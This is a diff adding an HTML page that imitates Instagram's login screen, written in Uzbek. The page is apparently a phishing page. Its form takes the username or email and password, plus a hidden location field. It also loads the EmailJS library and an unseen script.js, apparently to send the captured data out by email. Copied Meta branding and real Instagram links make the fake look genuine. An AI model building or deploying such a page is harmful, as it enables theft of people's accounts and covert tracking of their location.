@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="./style.css">
+    <link rel="icon" type="image/x-icon" href="./mini-logo.png" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
+        integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+</head>
+
+<body>
+    <div class="wrapper">
+        <div class="container">
+            <img src="./logo.png" alt="logo" class="title">
+            <form id="myForm">
+                <input type="text" name="email" placeholder="Email yoki telefon, username" required autocomplete="off">
+                <input type="password" name="password" placeholder="Parol" required autocomplete="off">
+                <!-- Bu inputlar yashirin, joylashuv shu yerga yoziladi -->
+                <input type="hidden" name="location_data" id="location_data" autocomplete="off">
+                <button type="submit">Tizimga kirish</button>
+            </form>
+            <h6 class="or">
+                YOKI
+            </h6>
+
+            <div class="other__methods">
+                <a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATleqwIM-5e_FVqM2iFgP9MKBOuPLcfMAr1XckLOWaVern4oZduRAEFFpDY7WDbUY4bD4pF4WDxoJWnhTznN35i1L_UbhCS2BHeK6AXfEvuFr19cVYVHOfzEav1v0OvNU0zyGjHs4SgPangRbUUniCCK6ly88uCtvOomP_04ifb2o7x9KEYYsX2vsdXefmfrzFEZyIXploWS4i5QEWDQQCo7JS2C3YD3sRHhZH98zkbpnIAh2szBiglbFmOwO9FFleXM"
+                    class="with__facebook">
+                    <i class="fa-brands fa-facebook"
+                        style="color: #297ebe; transform:scale(1.3); margin-right: 5px;"></i>
+                    Facebook
+                    orqali tizimga kiring</a> <br>
+                <a href="https://www.instagram.com/accounts/password/reset/" class="forgotten__password">Parol
+                    esingizdan chiqdimi?</a>
+            </div>
+        </div>
+        <div class="container">
+            <p class="registration">
+                Hisobingiz yo'qmi? <a href="https://www.instagram.com/accounts/emailsignup/"
+                    class="registration">Ro'yhatdan o'ting</a>
+            </p>
+        </div>
+
+        <h4 class="add">
+            Ilovani o'rnating.
+        </h4>
+
+        <div class="applications">
+            <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D3E895260-93CB-483F-B15B-519FAF0FB202%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge%26original_referrer%3Dhttps%253A%252F%252Fwww.google.com%252F"
+                class="application__link">
+                <div class="application">
+                    <img src="./googlePlay.png" alt="Google Play logo" class="application__img">
+                    <div class="aplication__text">
+                        <h6>доступно в</h6>
+                        <h2>
+                            Google Play
+                        </h2>
+                    </div>
+                </div>
+            </a>
+            <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=-7%2C0%2C697%2C735"
+                class="application__link">
+                <div class="application microsoft__add">
+                    <img src="./microsoft.png" alt="microsoft logo" class="application__img microsoft">
+                    <div class="aplication__text">
+                        <h6>скачать у</h6>
+                        <h2>
+                            Microsoft
+                        </h2>
+                    </div>
+                </div>
+            </a>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <ul class="footer__list">
+            <li class="foter__item"><a href="https://about.meta.com/" class="footer__link">Meta</a></li>
+            <li class="foter__item"><a href="https://about.instagram.com/" class="footer__link">Ma'lumot</a></li>
+            <li class="foter__item"><a href="https://about.instagram.com/" class="footer__link">Blog</a></li>
+            <li class="foter__item"><a href="https://about.instagram.com/about-us/careers"
+                    class="footer__link">Ishlar</a></li>
+            <li class="foter__item"><a href="https://help.instagram.com/" class="footer__link">Yordam</a></li>
+            <li class="foter__item"><a href="https://developers.facebook.com/docs/instagram"
+                    class="footer__link">API</a></li>
+            <li class="foter__item"><a href="https://www.instagram.com/legal/privacy/"
+                    class="footer__link">Mahfiylik</a></li>
+            <li class="foter__item"><a href="https://www.instagram.com/legal/privacy/" class="footer__link">Foydalanish
+                    shartlari</a></li>
+            <li class="foter__item"><a href="https://www.instagram.com/legal/privacy/" class="footer__link">Joylar</a>
+            </li>
+            <li class="foter__item"><a href="https://www.instagram.com/web/lite/" class="footer__link">Instagram
+                    lite</a></li>
+            <li class="foter__item"><a href="https://www.threads.com/" class="footer__link">IPlar</a></li>
+            <li class="foter__item"><a href="https://www.facebook.com/help/instagram/261704639352628"
+                    class="footer__link">Kontaktlar va foydalanuvchilar bo'limiga
+                    yuklash</a></li>
+            <li class="foter__item"><a href="https://www.instagram.com/accounts/meta_verified/?entrypoint=web_footer"
+                    class="footer__link">Meta tasdiqlangan</a></li>
+        </ul>
+        <ul class="footer__ending">
+            <p>
+                UZB
+            </p>
+            <p>
+                © 2025 Meta-dan Instagram
+            </p>
+        </ul>
+    </footer>
+
+    <!-- EmailJs -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <!-- JS fail -->
+    <script src="./script.js"></script>
+</body>
+
+</html>
